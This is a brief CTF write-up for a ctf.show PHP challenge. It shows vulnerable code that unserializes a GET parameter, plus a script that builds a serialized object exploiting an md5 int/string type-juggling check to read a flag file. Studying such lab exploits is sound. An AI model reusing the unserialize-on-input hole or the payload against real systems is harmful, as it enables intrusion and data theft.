# php

<https://ctf.show/challenges#%E7%AD%BE%E5%88%B0%C2%B7%E5%A5%BD%E7%8E%A9%E7%9A%84PHP-4492>

```php
<?php
    error_reporting(0);
    highlight_file(__FILE__);

    class ctfshow {
        private $d = '';
        private $s = '';
        private $b = '';
        private $ctf = '';

        public function __destruct() {
            $this->d = (string)$this->d;
            $this->s = (string)$this->s;
            $this->b = (string)$this->b;

            if (($this->d != $this->s) && ($this->d != $this->b) && ($this->s != $this->b)) {
                $dsb = $this->d.$this->s.$this->b;

                if ((strlen($dsb) <= 3) && (strlen($this->ctf) <= 3)) {
                    if (($dsb !== $this->ctf) && ($this->ctf !== $dsb)) {
                        if (md5($dsb) === md5($this->ctf)) {
                            echo file_get_contents("/flag.txt");
                        }
                    }
                }
            }
        }
    }

    unserialize($_GET["dsbctf"]);
```

构造一个类，利用`md5(123)==md5('123')`

类名和成员变量名都要对上，最后要url编码

```php
<?php
  class ctfshow  {
          private $d = '1';
          private $s = '2';
          private $b = '3';
          private $ctf = 123;
      }
  $a = new ctfshow ();
  echo urlencode(serialize($a));
?>

```
